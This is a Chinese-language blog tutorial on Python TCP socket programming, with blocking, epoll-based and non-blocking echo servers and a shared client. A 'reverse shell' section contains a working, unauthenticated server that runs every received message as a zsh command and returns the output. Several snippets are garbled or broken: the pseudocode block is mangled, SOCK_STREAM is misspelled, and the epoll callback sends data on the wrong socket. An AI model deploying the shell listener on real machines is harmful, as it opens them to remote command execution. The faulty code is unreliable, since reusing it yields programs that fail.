# python-socket编程


## 讲解

#### C/S架构

客户机和服务器结构
Server唯一的目的就是等待client的请求，client连上server发送必要的数据，然后等待server端完成请求的范阔



#### C/S网络编程

Server端进行设置，首先创建一个通信端点，让server端能够监听请求，之后就进入等待和处理Client请求的无限循环中

Client编程相对Server端编程简单，只要创建一个通信端点，建立到服务器的连接，就可以提出wing我就来





#### 套接字(socket)

是一种具有之前所说的“通信端点”概念的计算机网络数据结构。网络化的应用程序在开始任何通讯之前都必须创建套接字

> 套接字 = (ip, 端口)



**Python支持:**

\- AF_UNIX              --> Unix下进行通信的

\- AF_NETLINK        --> 是Linux下的套接字

\- AF_INET               --> 是基于网络的套接字 （我们下面的重点）



Python的`socket模块`创建TCP/IP套接字，方法如下：

```python
# 参数（套接字家族，套接字类型）
# AF_INET：基于网络的， SOCK_SREAM：代表TCP/IP

tcp_scoket = socket(socket.AF_INET, socket.SOCK_SREAM) 
```





**套接字对象的方法：**

服务端套接字函数：

<img src="http://image.xpshuai.cn/socket01%20.png"></img>

公共用途套接字函数：

<img src="http://image.xpshuai.cn/socket02.png"></img>



创建连接之后要关闭



###### 实例:

```bash
## 1.创建-个TCP服务器
SS. = socket()	#创建服务器套接字
ss.bind()	#把地址绑定到套接字上
s.listen()	#监听连接
inf loop;	#服务器无限循环
	CS.= ss.accept()	#接受客户端连接
cmmon loop;	#通信循环
	s.recy0/cs.send0	#对话(接受与发送)
cs.close0	#关闭客户端套接字


## 2、创建一个TCP客户端
cs.socket()	#创建客户端套接字
cs.connect()	#尝试连接套接字
common loop:	#通信循环
	cs.recx0/cs.send()	#对话(接受与发送)
cs.close()	#关闭客户端套接字

```







**反弹Shell：**

在客户端获取服务端的shell

1.获取Linux的shell：

server.py

```python
"""
反弹shell
"""
import socket
from subprocess import Popen,PIPE     # 执行系统命令

HOST = ''   # 如果是本机最为服务端，地址可以不用填写
PORT = 8888
BUFSIZE = 1024
ADDR = (HOST,PORT)
tcp_server = socket.socket()   # type默认是tcp
tcp_server.bind(ADDR)
tcp_server.listen(5)
print("开始监听")

while True:
    # 服务端和客户端的循环连接
    print("Waiting fpr connecting...")
    coon, addr = tcp_server.accept()  # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞
    print("... connected from:" + str(addr))
    # 下面是通信的循环
    while True:
        data = coon.recv(BUFSIZE)          # 读取客户端发送的消息 （指明一次性能接收的最大字节数量）
        if data:
            try:
                # 执行获取服务端的系统命令（在客户端连接后可以执行服务端的命令）
                cmd = Popen(['/bin/zsh', '-c', data], stdin=PIPE, stdout=PIPE)
                cmd_data = cmd.stdout.read()
                coon.send(cmd_data)
            except Exception:
                continue

        else:
            print("客户端{}已断开".format(addr))
            break

```

2.获取Window的shell：

```python

```







client.py不变

```python
import socket

HOST = ''   # 如果是本机最为服务端，地址可以不用填写
PORT = 8888
BUFSIZE = 1024
ADDR = (HOST,PORT)

tcp_cient = socket.socket()
tcp_cient.connect(ADDR)

print("客户端：\n")

# 数据交互循环
while True:
    msg = input('>>>')
    if msg:
        tcp_cient.send(msg.encode())   # 只能发送 bytes 类型的数据
        data = tcp_cient.recv(BUFSIZE)
        if not data:
            break
        print(data.decode())
    else:
        break

# tcp_cient.close()
# c.close()    # 主动断开   # 服务端会recv到一个空字符串

```



------



#### 1.阻塞的套接字

> 阻塞套接字不能和多个客户端进行通信

server.py

```python
"""
服务端：
阻塞套接字：  --->  阻塞套接字不能和多个客户端进行通信
"""
import socket

HOST = ''   # 如果是本机最为服务端，地址可以不用填写
PORT = 8888
BUFSIZE = 1024
ADDR = (HOST,PORT)
tcp_server = socket.socket()   # type默认是tcp
#tcp_server.bind(('',8888))     
tcp_server.bind(ADDR)    
tcp_server.listen(5)           # 可以挂起的最大连接数    accept就不算挂起
print("开始监听")

while True:
    # 服务端和客户端的循环连接
    print("Waiting fpr connecting...")
    coon, addr = tcp_server.accept()  # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞
    print("... connected from:" + str(addr))
    # 下面是通信的循环
    while True:
        data = coon.recv(BUFSIZE)          # 读取客户端发送的消息 （指明一次性能接收的最大字节数量）
        if data:
            print(data.decode())
            # 向client发送收到的信息
            coon.send(data)
        else:
            print("客户端{}已断开".format(addr))
            break
            
 #server端关闭连接
#tcp_server.close()
#accpet 阻塞   recv阻塞(读不到数据，就一直等到有数据为止)
```



client.py

```python
"""
最简单的客户端
三种方式的客户端都是一样的
"""

import socket

HOST = ''   # 如果是本机最为服务端，地址可以不用填写
PORT = 8888
BUFSIZE = 1024
ADDR = (HOST,PORT)

tcp_cient = socket.socket()
tcp_cient.connect(ADDR)

print("客户端：\n")

# 数据交互循环
while True:
    msg = input('>>>')
    if msg:
        tcp_cient.send(msg.encode())   # 只能发送 bytes 类型的数据
        data = tcp_cient.recv(BUFSIZE)
        if not data:
            break
        print(data.decode())
    else:
        break

# tcp_cient.close()
# c.close()    # 主动断开   # 服务端会recv到一个空字符串
```







#### 2.I/O多路复用的套接字

server.py

```python
"""
服务端
I/O多路复用

"""


# IO多路复用
# epoll  事件通知事件


# IO事件  计算机  可读事件（有数据了...）

# 通知机制       （某一事情发送之后，可读之后）  轮询


# epoll： 当socket变为可读的时候，发出通知
# epoll： 是惰性的事件回调：    操作系统只起到通知的作用。
# epoll： 目前Linux上效率最高的IO多路复用 技术 ！

# 1.监听套接字  2.对等套接字

import socket
import selectors

# windows没有epoll
sel = selectors.DefaultSelector()   # 会根据不同的操作系统选择相应的解释器   在linux是epoll   根据系统自动选择
sel2 = selectors.EpollSelector()   # 会根据不同的操作系统选择相应的解释器   在linux是epoll     Linux

server = socket.socket()
server.bind(('127.0.0.1',8888))
server.listen(5)


def accept(server):
    coon, addr = server.accept()
    sel.register(coon, selectors.EVENT_READ, read)

def read(coon):
    data = coon.recv(1024)
    if data:
        print(data)
        server.send(data.encode())
    else:
        print('Closing:',coon)
        sel.unregister(coon)   # 取消监听
        coon.close()
# 注册事件  事件触发直接调用
sel.register(server, selectors.EVENT_READ, accept)   # 监听事件的发生  参数三个： 套接字,可能发送的事件(变为可读事件),回调函数

print("开始监听")
while True:
    events_list = sel.select()   # 返回发生了事件的列表  查询已经准备好的套接字
    print("有套接字发生变化")
    for key, _ in events_list:  # 列表里面是个元组, key是元组里面的第一个值
        callback = key.data   # 某个套接字绑定的函数  key.data是函数
        callback(key.fileobj)   # 调用这个回调函数     fileobj是对应套接字


# sel.select()     有两种情况：
#1.  客户端请求连接 key.data是accept  key.fileobj 是server
#2.  客户端请求连接 key.data是read  key.fileobj 是conn

"""
1.先在指定的套接字上注册对应的事件及回调
2.不断的查询所有已经准备好资源的套接字
3.不需要考虑套接字与事件只管调用
"""
```

client.py 相同





#### 3.非阻塞的套接字

server.py

```python
"""
服务端
非阻塞套接字
"""
import socket


s = socket.socket()           # type默认是tcp
s.bind(('127.0.0.1', 8888))

# 这个必须在操作之前设置
s.setblocking(False)   # 变为非阻塞套接字， 立刻返回异常

s.listen(5)

client_list = []

while True:        # 第一层循环只负责生成对等套接字
    try:
        coon, addr = s.accept()     # 多个coon才能与多个客户端进行通信
    except BlockingIOError as e:
        pass
    else:
        print("客户端{}连接成功".format(addr))
        coon.setblocking(False)  # 设置为非阻塞
        client_list.append(coon)   # 保留已生成的对等套接字
        # print(coon, addr)

    for client_socket in client_list:   # 第二层循环 把所有已保留的套接字都执行一遍
        try:
            data = client_socket.recv(1024)
        except BlockingIOError:
            pass
        else:
            if data:
                print('{}:{}'.format(client_socket, data.decode()))
                client_socket.send(data)
            else:
                print('{}'.format(client_socket))
                client_socket.close()
                client_list.remove(client_socket)    # 成功处理完一个，就移除一个


## 实现方法：非阻塞+轮询
# connect操作一定会引发BlockingIOError异常
# 如果连接没有建立，那么send操作引发OSError异常


"""
accept 阻塞：
在没有新的套接字来之前，
不能处理已经建立连接的套接字的请求

recv 阻塞:
在没有接受到客户端请求数据之前，
不能与其他客户端建立连接
"""

```

client.py 相同





---

###### 成为大师

```python
"""
1. 多练习，一定要善于发现感兴趣的内容，通过所学知识去实现
2. 关注相关领域：
	寻找大师，跟随大师，与大师同行，洞察大师，成为大师
	知乎，ve2x.com, github
3.扩展：
	想要提高，就不能守着自己现有的东西而不去学习新的
4.应用：
	根据自己的需求，动手实践，达到目标
	
安全：
	分析行为：通过日志，分析攻击行为(re)

"""
```



---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/python-socket%E7%BC%96%E7%A8%8B/  

